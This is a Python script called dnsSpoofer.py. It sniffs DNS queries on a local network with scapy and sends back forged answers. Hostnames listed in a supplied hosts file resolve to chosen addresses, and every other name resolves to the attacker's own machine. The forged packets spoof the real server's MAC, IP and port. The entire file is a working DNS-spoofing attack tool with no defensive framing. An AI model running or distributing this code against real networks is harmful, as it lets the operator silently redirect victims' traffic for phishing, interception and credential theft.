#!/usr/bin/env python

from scapy.all import *
import sys, getopt, netifaces

hostsDict = {}
localAddress = 0

def loadHostsFile(hfile):
        global hostsDict
        fd = open(hfile, "r")
        if fd:
                for line in fd.readlines():
                        #print "line: ", line
                        if (not line.startswith("#")) and (line != '\n'):
                                parts = line.strip("\n").replace("\t", " ").split(" ")
                                cleanParts = [part for part in parts if part != '']
                                #print cleanParts
                                hostsDict[cleanParts[1]] = cleanParts[0]
        fd.close()
        #print hostsDict

def usage():
        print "Usage: sudo ./dnsSpoofer.py [-i interface] [-f hostsfile] [bpf expression]"

def main(argv):
        global localAddress
        filterString = "udp dst port 53"
        try:
                opts, args = getopt.getopt(argv, "hi:f:")
        except getopt.GetoptError:
                usage()
                sys.exit(2)
        for opt, arg in opts:
                if opt in ("-h"):
                        usage()
                        sys.exit()
                elif opt in ("-i"):
                        conf.iface = arg
                elif opt in ("-f"):
                        loadHostsFile(arg)
        if len(args) > 0:
                filterString = args[0]

        addrs = netifaces.ifaddresses(conf.iface)
        ipinfo = addrs[socket.AF_INET][0]
        localAddress = ipinfo['addr']

        sniff(filter=filterString, prn=procPacket, store=0)

def procPacket(p):
        #Lets grab the source mac and dst mac
        if p.haslayer(Ether):
                eth_layer = p.getlayer(Ether)
                src_mac = eth_layer.src
                dst_mac = eth_layer.dst

        #Now on to grabbing the src IP and dst IP
        if p.haslayer(IP):
                ip_layer = p.getlayer(IP)
                src_ip = ip_layer.src
                dst_ip = ip_layer.dst

        #Woot..UDP Layer
        if p.haslayer(UDP):
                udp_layer = p.getlayer(UDP)
                src_port = udp_layer.sport
                dst_port = udp_layer.dport

        #And finally..the DNS layer
        if p.haslayer(DNS):
                dns_layer = p.getlayer(DNS)
                d = DNS()
                d.id = dns_layer.id     #Transaction ID
                d.qr = 1                #1 for Response
                d.opcode = 16
                d.aa = 0
                d.tc = 0
                d.rd = 0
                d.ra = 1
                d.z = 8
                d.rcode = 0
                d.qdcount = 1           #Question Count
                d.ancount = 1           #Answer Count
                d.nscount = 0           #No Name server info
                d.arcount = 0           #No additional records
                d.qd = str(dns_layer.qd)
                if dns_layer.qd:
                        for key in hostsDict.keys():
                                if dns_layer.qd.qname.find(key) != -1:
                                        d.an = DNSRR(rrname=dns_layer.qd.qname, ttl=330, type="A", rclass="IN", rdata=hostsDict[key])
                                        break
                        else:
                                d.an = DNSRR(rrname=dns_layer.qd.qname, ttl=330, type="A", rclass="IN", rdata=str(localAddress))

        #Send the spoofed packet away!
        #Don't forget to switch stuffs lawl
                        spoofed = Ether(src=dst_mac, dst=src_mac)/IP(src=dst_ip, dst=src_ip)/UDP(sport=dst_port, dport=src_port)/d

        #Off we go!
                        sendp(spoofed)

if __name__ == "__main__":
    main(sys.argv[1:])
